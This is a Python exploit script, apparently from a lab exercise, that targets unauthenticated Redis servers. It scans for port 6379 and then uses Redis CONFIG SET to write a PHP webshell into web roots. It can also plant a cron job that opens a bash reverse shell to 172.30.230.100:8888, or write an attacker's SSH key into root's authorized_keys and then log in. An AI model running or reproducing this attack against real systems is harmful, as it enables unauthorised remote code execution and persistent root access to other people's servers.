#！/usr/bin/env python

import redis
import socket
import paramiko
from config import wwwroot
import requests

sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwXWo3NFcCEmsXMHLKNeth2xMrNGFhvr/Wpt1dhdSpoypc95eLv8eaY3t2ETtS95Wz2pr0YElFHcLHBaTybZLyMkrPHdlqwh89Xw3Ux5J9+ZWOR5gJgsXQGw00Gj9Wmynp0E7qzpKBgaMw9jRR6zQ+v0qJUd57R/IWldPbEe9F424z6lm7MwdqLjNzPRcFf94VdT1hU2rGt4648z/bEHxiGJ3VxD9r0VCigoa2HVC95xvlbEsg7rkQoBGELHyW5LhFfv6bWnswBiXF7L5gS/qKJeovHZFxDdRMHxJkDQxRj8CMSw2Y9W19wD5lJDSi+110mBiAbFIf7RTUfDRjPj+c6GHzfVCWhWm7Eauyfv2iEqInvXKI8JeUT/+thT85md54ibBIYlsR6b3D1Te8Nl0g0N55Tyk/YBFaQ7yKunUYpAldwbzLJK0J2CLgcdcDpOJDad4t1JUE3WQR7t+uEyrx0qqB88ifkpL/AFZuvCpAUFRh4TCs91vmLPVC7hO1w3c= root@kali'

# print(wwwroot.ALL)
#用socket扫描端口
def scan_port(ip):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(0.3)
    try:
        s.connect((ip,6379))
        print("端口开放！！！")
        s.close
        check_redis_connect(ip)
    except Exception:
        pass    

def check_redis_connect(ip):
    try:
        client = redis.StrictRedis(host=ip,port=6379,socket_timeout=0.3)
        print(client.client_list())
        print("[+]redis未授权存在")
        exp_webshell(client)
        # exp_crontab(client)
        # exp_ssh(client,ip)       
    except Exception as e:
        # print(e)
        print("无法连接，reids未授权不存在") 

def get_webroot(redis_client):
    roots = []
    for pre in wwwroot.ALL:
        for suf in wwwroot.SUFFIXES:
            try:
                root = pre + '/' + suf
                redis_client.config_set('dir',root)
            except Exception as e:
                # print(e)
                continue
            roots.append(root)
    
    if not roots:
        print('[-]未找到目标主机的web路径')
    else:
        print('[+]找到目标主机的web路径 %s'%str(root))
    return roots                    

def test_web():
    url = 'http://172.30.230.107/shell.php'
    response = requests.get(url)
    if response.status_code == 200:
        return True
    else:
        return False

def exp_webshell(redis_client):
    #1.找到web服务器的根目录
    roots = get_webroot(redis_client)
    for root in roots:        
        redis_client.config_set('dir',root)
        redis_client.config_set('dbfilename','shell.php')
        redis_client.set('x','<?php phpinfo(); ?>')
        redis_client.save()
    test = test_web()
    if test:
        print('webshell已经写入成功')
    else:
        print('webshell写入失败')    
            
      
    
def exp_crontab(redis_client):
    root = '/var/spool/cron/'
    redis_client.config_set('dir',root)
    redis_client.config_set('dbfilename','root')
    redis_client.set('s','\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/172.30.230.100/8888 0>&1\n\n')
    redis_client.save()
    print('定时任务已经创建')
    
def exp_ssh(redis_client,ip):
    root = '/root/.ssh/'
    redis_client.config_set('dir',root)
    redis_client.config_set('dbfilename','authorized_keys')
    redis_client.set('n','\n\n'+sshkey+'\n\n')
    redis_client.save()
    print('免密登录已完成')
    connect_ssh(ip)
    
def connect_ssh(ip):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip,22,'root',sshkey)
        print('ssh 连接成功')
    except Exception:
        print('连接失败')    
           
                

# if __name__ == '__main__':
scan_port('172.30.230.107')  